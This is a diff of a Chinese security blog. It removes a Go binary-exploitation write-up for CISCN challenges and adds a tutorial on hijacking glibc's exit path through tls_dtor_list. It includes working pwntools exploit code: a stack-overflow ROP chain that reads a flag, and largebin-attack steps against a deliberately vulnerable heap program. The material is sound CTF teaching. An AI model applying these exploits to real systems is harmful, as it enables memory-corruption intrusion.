-<h4 id="栈扩展机制"><a href="#栈扩展机制" class="headerlink" title="栈扩展机制"></a>栈扩展机制</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:</span><br><span class="line">lea     r12, [rsp+var_218]			</span><br><span class="line">cmp     r12, [r14+10h]				//上面两句也有可能是cmp rsp, [r14+10h]这种形式</span><br><span class="line">jbe     loc_4C18C0</span><br><span class="line">......</span><br><span class="line">loc_4C18C0:</span><br><span class="line">mov     [rsp+arg_0], rax</span><br><span class="line">mov     [rsp+arg_8], rbx</span><br><span class="line">mov     [rsp+arg_10], rcx</span><br><span class="line">call    runtime_morestack_noctxt</span><br><span class="line">mov     rax, [rsp+arg_0]</span><br><span class="line">mov     rbx, [rsp+arg_8]</span><br><span class="line">mov     rcx, [rsp+arg_10]</span><br><span class="line">jmp     a</span><br></pre></td></tr></table></figure></div>
+    <title>tls_dtor_list劫持exit执行-高版本glibc利用思路之一</title>
+    <url>/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/</url>
+    <content><![CDATA[<h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>主要链条：</p>
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">exit-&gt;__run_exit_handlers-&gt;__call_tls_dtors</span><br></pre></td></tr></table></figure></div>
 
-<p>r14+0x10地址处存的就是当前栈段的上限信息，不够时会调用runtime_morestack_noctxt进行扩展。call一个函数时与c同样会把返回地址存到栈上，在栈扩展中也会维护好这个返回地址的位置。而每次栈扩展出的新栈与原来的栈是不连续的，但一个栈段只要大小没有耗尽，也可以存多个函数的栈帧。</p>
+<p>源码：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_DEMANGLE(var)     PTR_MANGLE (var)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_MANGLE(var) \</span></span><br><span class="line"><span class="meta">  (var) = (__typeof (var)) ((uintptr_t) (var) ^ THREAD_GET_POINTER_GUARD ())</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> THREAD_GET_POINTER_GUARD() \</span></span><br><span class="line"><span class="meta">  THREAD_GETMEM (THREAD_SELF, header.stack_guard)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> THREAD_GETMEM(descr, member) \</span></span><br><span class="line"><span class="meta">  descr-&gt;member</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line">__call_tls_dtors (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> (tls_dtor_list)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">cur</span> =</span> tls_dtor_list;</span><br><span class="line">      dtor_func func = cur-&gt;func;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">      func (cur-&gt;obj);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Ensure that the MAP dereference happens before</span></span><br><span class="line"><span class="comment">	 l_tls_dtor_count decrement.  That way, we protect this access from a</span></span><br><span class="line"><span class="comment">	 potential DSO unload in _dl_close_worker, which happens when</span></span><br><span class="line"><span class="comment">	 l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */</span></span><br><span class="line">      atomic_fetch_add_release (&amp;cur-&gt;<span class="built_in">map</span>-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">      <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__call_tls_dtors)</span><br><span class="line">......</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  dtor_func func;</span><br><span class="line">  <span class="type">void</span> *obj;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>很清楚能看到如果<code>tls_dtor_list</code>不为空，就会把cur指针指向<code>tls_dtor_list</code>，然后将其中func的函数指针字段经过<code>PTR_DEMANGLE</code>处理后，直接作为函数调用，参数是<code>cur-&gt;obj</code>。</p>
+<p><code>tls_dtor_list</code>记录了<code>dtor_list</code>这个单向链表的表头，我们可以通过覆盖<code>tls_dtor_list</code>的值为一个我们可控的内存区域，然后就能伪造各个字段了。但最麻烦的是在调用func前有一个异或的逻辑，实际上会与<code>fs:0x30（tcbhead_t-&gt;pointer_guard）</code>处的内容进行异或，那我们首先要想办法泄露出这个内容，或者是直接改写这个位置的内容，才可以调用我们想要的函数。所以一般会利用largebin attack或者unsortedbin attack两次，完成<code>tls_dtor_list</code>的修改以及对<code>tcbhead_t-&gt;pointer_guard</code>的修改。</p>
+<h4 id="汇编实现"><a href="#汇编实现" class="headerlink" title="汇编实现"></a>汇编实现</h4><p>主要逻辑如下：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">&lt;__call_tls_dtors+<span class="number">17</span>&gt;    mov    rbp, qword ptr fs:[rbx]             </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">21</span>&gt;    test   rbp, rbp                            </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">24</span>&gt;    je     __call_tls_dtors+<span class="number">93</span>         </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">26</span>&gt;    nop    word ptr [rax + rax]</span><br><span class="line">&lt;__call_tls_dtors+<span class="number">32</span>&gt;    mov    rdx, qword ptr [rbp + <span class="number">0x18</span>]         </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">36</span>&gt;    mov    rax, qword ptr [rbp]                </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">40</span>&gt;    ror    rax, <span class="number">0x11</span></span><br><span class="line">&lt;__call_tls_dtors+<span class="number">44</span>&gt;    xor    rax, qword ptr fs:[<span class="number">0x30</span>]            </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">53</span>&gt;    mov    qword ptr fs:[rbx], rdx             </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">57</span>&gt;    mov    rdi, qword ptr [rbp + <span class="number">8</span>]            </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">61</span>&gt;    call   rax    </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">63</span>&gt;    mov    rax, qword ptr [rbp + <span class="number">0x10</span>]</span><br><span class="line">&lt;__call_tls_dtors+<span class="number">67</span>&gt;    lock sub qword ptr [rax + <span class="number">0x468</span>], <span class="number">1</span></span><br><span class="line">&lt;__call_tls_dtors+<span class="number">76</span>&gt;    mov    rdi, rbp</span><br><span class="line">&lt;__call_tls_dtors+<span class="number">79</span>&gt;    call   <span class="built_in">free</span>@plt                    &lt;<span class="built_in">free</span>@plt&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>先是会把rbp指向<code>tls_dtor_list</code>，也就是<code>dtor_list</code>链表的头节点，正是我们修改的地方。然后取出func字段后，会先右移0x11位，再与<code>fs:[0x30]</code>处的内容异或。最后call进行调用。那么我们传func字段时就先异或再左移，就能够解出正确的函数指针。需要注意的是，如果我们不是直接利用头节点处的<code>dtor_list</code>，map域也要进行伪造，使<code>map+0x468</code>为一个可写地址，而且之后的<code>free</code>也需要想办法绕过，所以最好还是直接一次直接利用完成。因为这里<code>mov rdx, qword ptr [rbp + 0x18]</code>直接把rdx拉到我们可控的堆区域了，而且我们控制next域就可以控制rdx的值，其实我们也可以走<code>setcontext</code>的打法。</p>
+<h4 id="利用验证"><a href="#利用验证" class="headerlink" title="利用验证"></a>利用验证</h4><p>自己写一个堆的菜单题，不做什么限制方便原理验证。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> *chunk_list[<span class="number">32</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. Add&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Delete&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. Edit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4. Show&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5. Exit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;choice &gt;&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx, size;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;idx:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;size:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">    chunk_list[idx] = <span class="built_in">malloc</span>(size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx,size;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;idx:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;size:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,chunk_list[idx], size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;idx:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">    <span class="built_in">free</span>(chunk_list[idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;idx:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">    <span class="built_in">puts</span>(chunk_list[idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">end</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Bye~&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> choice;</span><br><span class="line">    <span class="type">void</span> *libc_base = &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="comment">// printf(&quot;puts_addr:%p\n&quot;,&amp;puts);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc_base:%p\n&quot;</span>, libc_base);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">        <span class="keyword">switch</span> (choice)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            add();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            delete ();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            edit();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            show();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            end();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>首先泄露libc基址和heap基址，这里libc基址我直接在主程序中打印出来了，其实也可以通过<code>show largebin</code>来获得。</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="number">0x428</span>)  <span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x428</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x418</span>)  <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x500</span>)  <span class="comment">#4</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">b&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x16b0</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure></div>
+
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202642330.png"
+                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128123022279.png"
                       class=""
                 >
 
+<p>然后free掉一个和0x430那个larginbin属于一个大小范围的，但又比0x430小的chunk3，修改以及在largebin中的那个chunk的bk_nextsize域为<code>target_addr-0x20</code>，然后申请一个大chunk，从topchunk分配，并把chunk3置入largebin，触发largebin attack，往<code>target_addr</code>写chunk3的地址。</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(tls_dtor_list-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x500</span>)        <span class="comment">#trigger largebin attack 1</span></span><br></pre></td></tr></table></figure></div>
+
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202650340.png"
-                      class=""
-                >
-
-<p>可以看到这里的栈实际不在x86_64常使用的栈段中。而且确实会把返回地址压入栈。</p>
-<h4 id="传参顺序"><a href="#传参顺序" class="headerlink" title="传参顺序"></a>传参顺序</h4><p>传参用到的寄存器依次是：AX，BX，CX，DI，SI，R8，R9，R10，R11</p>
-<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><h5 id="CISCN-2023-初赛-shallwego"><a href="#CISCN-2023-初赛-shallwego" class="headerlink" title="[CISCN 2023 初赛]shallwego"></a>[CISCN 2023 初赛]shallwego</h5><p>先运行一下看看：</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202702201.png"
-                      class=""
-                >
-
-<p>发现提供了一个shell窗口，但好像要先对cert进行一些操作。看IDA反汇编结果，其中在<strong>main_unk_func0b05</strong>有很多可疑的字符串，经整理大概有如下那么多：</p>
-<div class="highlight-container" data-rel="Txt"><figure class="iseeu highlight txt"><table><tr><td class="code"><pre><span class="line">nAcDsMicN</span><br><span class="line"></span><br><span class="line">echo</span><br><span class="line">exit</span><br><span class="line">cert</span><br><span class="line">cd</span><br><span class="line">cat flag</span><br><span class="line">ls -al</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></div>
-
-<p>其中很多都是命令，有一个字符串是在cert命令后检测的。我们通过动态调试能够发现，r8实际存的是命令（不包括操作符）的长度，rbx存的是输入的整个命令被空格分隔的段数。那我们就可以先执行个 <code>cert nAcDsMicN abcdefg</code> 动调看看。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202742958.png"
-                      class=""
-                >
-
-<p>之后会进入 <strong>main_unk_func0b01</strong> 中，这里实际对我们输入的第三段（其实这里我们已经可以看作大概是<code>cert 用户名 密码</code>这样一个认证过程）进行加密，与一个写死的字符串进行比较，而且rc4加密的密钥也直接写在程序中了。那么我们就可以先将密文base64解码后，把得到的内容当作密码输入进去，然后看rc4加密后的结果，这个结果就是正确的密码了，因为rc4是对称加密算法。最终得到的密码值为<strong>S33UAga1n@#!</strong></p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202759540.png"
+                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128123458788.png"
                       class=""
                 >
 
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202808837.png"
-                      class=""
-                >
-
-<p>然后shell提示符就会变成 <code>nightingale#</code> ，之后也可以正常调用其他的设置好的命令，但给的那几个命令都不能直接获取真实flag的值，需要再次寻找漏洞点。经过分析发现别的命令都没什么问题，唯独echo这个命令有两段函数专门处理。并且能打印出我们输入的内容，可以尝试进行栈溢出。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202821181.png"
-                      class=""
-                >
-
-<p>看到这兴奋起来了，因为这里往栈上写了0x75，也就是u，看来是要开始将输入内容存到栈上了。我们的返回地址在<strong>0xc00011adc8</strong>，而输入从<strong>0xc00011ab98</strong>开始存，其中间隔了0x230个字节。然后这个循环中实际有<code>cmp dl, &#39;+&#39;</code>这个条件判断，如果满足会直接调回去自增rax，也就是循环中的下标自增，直接跳过了后面往栈上写的部分。</p>
-<p>那我们先试试echo 0x230字节的垃圾字符看看。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202832431.png"
-                      class=""
-                >
-
-<p>发现这里最后rdx大于0x200，就直接略过了将值赋值到栈上的操作。说明单次输入不能超过0x200字节，那如果我们在输入中间加入空格呢？</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202844042.png"
-                      class=""
-                >
-
-<p>这次成功跳过了大小的检测，再往下执行看看效果。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202852228.png"
-                      class=""
-                >
-
-<p>然后发现直接崩掉了，因为rax是一个下标，所以推断是rbx被更改了以至于赋值失败，那么rbx是在哪里被赋值的呢。实际前面有一句<code>mov rbx, [rsp+298h+var_20]</code>,也就是这个rbx基址是存在<strong>ret_addr-0x20</strong>处的。那我们不能更改这个位置的值，但我们又无法获知这个位置的值，该怎么办呢？很巧的是，程序刚好碰到+会跳过赋值，所以我们可以用8个+来保存rbx。其实也不必那么麻烦，直接全用+填充，最后再覆盖也行。然后就能成功覆盖返回地址，但这里这个填充字符数有点迷，最后我本地动调后填充了0x229个字节后才覆盖到返回地址。</p>
-<p>之后是正常的ROP，因为有syscall，就先把&#x2F;bin&#x2F;sh读取到一个地方，然后再用execve调用打即可。最后复现时本地能够用execve通，但远程却有问题，只能拿orw打，不知道是为什么。</p>
-<h6 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h6><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 你的 Base64 编码字符串</span></span><br><span class="line">encoded_str = <span class="string">&quot;JLIX8pbSvYZu/WaG&quot;</span></span><br><span class="line"><span class="comment"># 进行 Base64 解码</span></span><br><span class="line">decoded_bytes = base64.b64decode(encoded_str)</span><br><span class="line"><span class="comment"># 打印解码后的字节字符串</span></span><br><span class="line"><span class="built_in">print</span>(decoded_bytes)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./service&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node4.anna.nssctf.cn&quot;,28629)</span></span><br><span class="line">passwd = <span class="string">b&quot;S33UAga1n@#!&quot;</span></span><br><span class="line">payload = <span class="string">b&quot;cert nAcDsMicN &quot;</span> + passwd</span><br><span class="line">p.sendlineafter(<span class="string">&quot;shell$&quot;</span>,payload)</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000444fec</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000041e818</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x000000000049e11d</span></span><br><span class="line">pop_rax_ret = <span class="number">0x000000000040d9e6</span></span><br><span class="line">syscall = <span class="number">0x000000000040328c</span></span><br><span class="line">ret = <span class="number">0x000000000040103d</span></span><br><span class="line">main = <span class="number">0x00000000004C1D60</span></span><br><span class="line">data = <span class="number">0x5A34A0</span></span><br><span class="line">payload = (<span class="string">b&quot;echo &quot;</span>.ljust(<span class="number">0x1f0</span>,<span class="string">b&quot;A&quot;</span>) + <span class="string">b&quot; &quot;</span>).ljust(<span class="number">0x229</span>,<span class="string">b&quot;+&quot;</span>) + p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x8</span>) + p64(syscall)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>) + p64(pop_rdi_ret) + p64(data) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(syscall) </span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x40</span>) + p64(syscall)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">1</span>) + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x40</span>) + p64(syscall)</span><br><span class="line"><span class="comment">#+ p64(pop_rax_ret) + p64(0x3b) + p64(pop_rdi_ret) + p64(data) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(syscall) + p64(main)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;nightingale#&quot;</span>,payload)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">&quot;/flag\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-
-
-<h5 id="CISCN-2024-初赛-gostack"><a href="#CISCN-2024-初赛-gostack" class="headerlink" title="[CISCN 2024 初赛]gostack"></a>[CISCN 2024 初赛]gostack</h5><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202922399.png"
-                      class=""
-                >
-
-<p>先运行一遍找提示字符串，看到调用位置在main_func3，直接gdb打断点进去调试一下。发现输入存在如下位置，但是存在栈上的是指针，没什么用。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202932191.png"
-                      class=""
-                >
-
-<p>之后还会把数据写到栈的另一个地方，这里直接把内容复制到栈上了，并且没有检测加跳转，可能会有溢出。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202943137.png"
+                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128123536544.png"
                       class=""
                 >
 
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202953894.png"
+                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128123654313.png"
+                      class=""
+                >
+
+<p>然后故技重施，再来次largebin attack改<code>tcbhead_t-&gt;pointer_guard</code>为一个我们知道的堆地址，这里我们可以先把<code>fake_dtor_list-&gt;next</code>改成一个可控的堆区域先，方便后面栈迁移。这里<code>fs_base</code>的地址相对于libc基址是固定的，计算一下就可以得出。</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">3</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>)+p64(heap_base+<span class="number">0x1af0</span>))    <span class="comment">#next=chunk2-&gt;data</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x4f8</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x600</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(fs_base+<span class="number">0x30</span>-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x600</span>)        <span class="comment">#trigger largebin attack 2</span></span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241127183520245.png"
                       class=""
                 >
 
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922203005886.png"
+                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128124109770.png"
                       class=""
                 >
 
-<p>然后我们再看看程序的其他部分，其中有个<strong>main_executeCommand</strong>函数引入注目，其中有如下两个子函数：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">call    os_exec_Command</span><br><span class="line">...</span><br><span class="line">call    os_exec__ptr_Cmd_Run</span><br></pre></td></tr></table></figure></div>
